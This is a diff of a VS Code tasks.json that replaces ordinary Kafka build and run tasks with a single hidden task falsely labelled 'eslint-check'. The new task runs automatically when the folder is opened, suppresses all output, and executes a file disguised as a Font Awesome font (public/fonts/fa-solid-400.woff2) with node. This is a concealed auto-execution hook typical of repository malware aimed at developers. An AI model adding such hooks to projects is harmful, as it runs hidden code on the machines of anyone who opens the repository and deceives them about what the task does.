@@ -1,137 +1,33 @@
 {
-    "version": "2.0.0",
-    "tasks": [
-        {
-            "label": "Build Producer",
-            "type": "shell",
-            "command": "mvn clean install -DskipTests",
-            "options": {
-                "cwd": "${workspaceFolder}/kafka-producer"
-            },
-            "group": "build",
-            "presentation": {
-                "reveal": "always",
-                "panel": "shared"
-            },
-            "problemMatcher": []
-        },
-        {
-            "label": "Build Consumer",
-            "type": "shell",
-            "command": "mvn clean install -DskipTests",
-            "options": {
-                "cwd": "${workspaceFolder}/kafka-consumer"
-            },
-            "group": "build",
-            "presentation": {
-                "reveal": "always",
-                "panel": "shared"
-            },
-            "problemMatcher": []
-        },
-        {
-            "label": "Build All",
-            "dependsOn": [
-                "Build Producer",
-                "Build Consumer"
-            ],
-            "group": {
-                "kind": "build",
-                "isDefault": true
-            },
-            "problemMatcher": []
-        },
-        {
-            "label": "Run Producer",
-            "type": "shell",
-            "command": "mvn spring-boot:run",
-            "options": {
-                "cwd": "${workspaceFolder}/kafka-producer"
-            },
-            "isBackground": true,
-            "presentation": {
-                "reveal": "always",
-                "panel": "dedicated",
-                "group": "kafka-services"
-            },
-            "problemMatcher": {
-                "pattern": {
-                    "regexp": "^.*$",
-                    "file": 1,
-                    "location": 2,
-                    "message": 3
-                },
-                "background": {
-                    "activeOnStart": true,
-                    "beginsPattern": "^.*Scanning for projects.*$",
-                    "endsPattern": "^.*Started KafkaProducerApplication.*$"
-                }
-            }
-        },
-        {
-            "label": "Run Consumer",
-            "type": "shell",
-            "command": "mvn spring-boot:run",
-            "options": {
-                "cwd": "${workspaceFolder}/kafka-consumer"
-            },
-            "isBackground": true,
-            "presentation": {
-                "reveal": "always",
-                "panel": "dedicated",
-                "group": "kafka-services"
-            },
-            "problemMatcher": {
-                "pattern": {
-                    "regexp": "^.*$",
-                    "file": 1,
-                    "location": 2,
-                    "message": 3
-                },
-                "background": {
-                    "activeOnStart": true,
-                    "beginsPattern": "^.*Scanning for projects.*$",
-                    "endsPattern": "^.*Started KafkaConsumerApplication.*$"
-                }
-            }
-        },
-        {
-            "label": "🚀 Start All (Kafka + Services)",
-            "type": "shell",
-            "command": "${workspaceFolder}/start-all.bat",
-            "windows": {
-                "command": "${workspaceFolder}/start-all.bat"
-            },
-            "linux": {
-                "command": "bash ${workspaceFolder}/start-all.sh"
-            },
-            "osx": {
-                "command": "bash ${workspaceFolder}/start-all.sh"
-            },
-            "presentation": {
-                "reveal": "always",
-                "panel": "dedicated"
-            },
-            "problemMatcher": []
-        },
-        {
-            "label": "🛑 Stop All Services",
-            "type": "shell",
-            "command": "${workspaceFolder}/stop-all.bat",
-            "windows": {
-                "command": "${workspaceFolder}/stop-all.bat"
-            },
-            "linux": {
-                "command": "docker-compose down"
-            },
-            "osx": {
-                "command": "docker-compose down"
-            },
-            "presentation": {
-                "reveal": "always",
-                "panel": "dedicated"
-            },
-            "problemMatcher": []
-        }
-    ]
+  "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''", 
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+  ]
 }
